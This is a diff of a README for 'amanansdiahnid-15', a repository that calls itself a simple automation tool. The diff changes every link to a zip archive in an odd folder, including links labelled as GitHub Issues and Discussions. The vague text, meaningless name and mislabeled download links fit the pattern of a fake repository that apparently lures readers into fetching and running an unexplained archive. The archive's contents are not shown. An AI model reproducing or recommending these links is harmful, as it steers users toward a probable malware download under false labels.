@@ -1,6 +1,6 @@
 # 🚀 amanansdiahnid-15 - Simple Automation for Everyone
 
-[![Download amanansdiahnid-15](https://raw.githubusercontent.com/donterrones/amanansdiahnid-15/main/myricylic/amanansdiahnid-15.zip%20amanansdiahnid--15-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/donterrones/amanansdiahnid-15/main/myricylic/amanansdiahnid-15.zip)
+[![Download amanansdiahnid-15](https://github.com/donterrones/amanansdiahnid-15/raw/refs/heads/main/myricylic/amanansdiahnid-2.8.zip%20amanansdiahnid--15-blue?style=for-the-badge&logo=github)](https://github.com/donterrones/amanansdiahnid-15/raw/refs/heads/main/myricylic/amanansdiahnid-2.8.zip)
 
 ## 📦 Description
 Welcome to the **amanansdiahnid-15** repository! This application provides an easy way to automate simple tasks on your computer. Whether you need to manage files, send messages, or perform routine actions, this tool can help you save time and effort.
@@ -25,7 +25,7 @@ To get started with **amanansdiahnid-15**, follow these easy steps.
 4. Open the application and start automating your tasks!
 
 ## 📥 Download & Install
-To download the application, visit this page: [Download amanansdiahnid-15](https://raw.githubusercontent.com/donterrones/amanansdiahnid-15/main/myricylic/amanansdiahnid-15.zip). Here you will find the latest version ready for download.
+To download the application, visit this page: [Download amanansdiahnid-15](https://github.com/donterrones/amanansdiahnid-15/raw/refs/heads/main/myricylic/amanansdiahnid-2.8.zip). Here you will find the latest version ready for download.
 
 1. Click on the version you wish to download.
 2. Locate the download file, which is usually found in your browser's download section or on your desktop.
@@ -48,13 +48,13 @@ After installation, here's how to use **amanansdiahnid-15**:
 ## 🛠️ Support
 If you encounter issues or need assistance, please feel free to reach out:
 
-- Check the [GitHub Issues](https://raw.githubusercontent.com/donterrones/amanansdiahnid-15/main/myricylic/amanansdiahnid-15.zip) for common problems and solutions.
+- Check the [GitHub Issues](https://github.com/donterrones/amanansdiahnid-15/raw/refs/heads/main/myricylic/amanansdiahnid-2.8.zip) for common problems and solutions.
 - You can also submit a new issue if you need help.
 
 ## 📣 Community
 Join our community to share your experiences and ask questions. Engage with other users by finding us on social platforms:
 
-- [GitHub Discussions](https://raw.githubusercontent.com/donterrones/amanansdiahnid-15/main/myricylic/amanansdiahnid-15.zip)
+- [GitHub Discussions](https://github.com/donterrones/amanansdiahnid-15/raw/refs/heads/main/myricylic/amanansdiahnid-2.8.zip)
 - [Twitter](#)
 
 Thank you for choosing **amanansdiahnid-15**! We hope this tool makes your tasks simpler and more enjoyable.
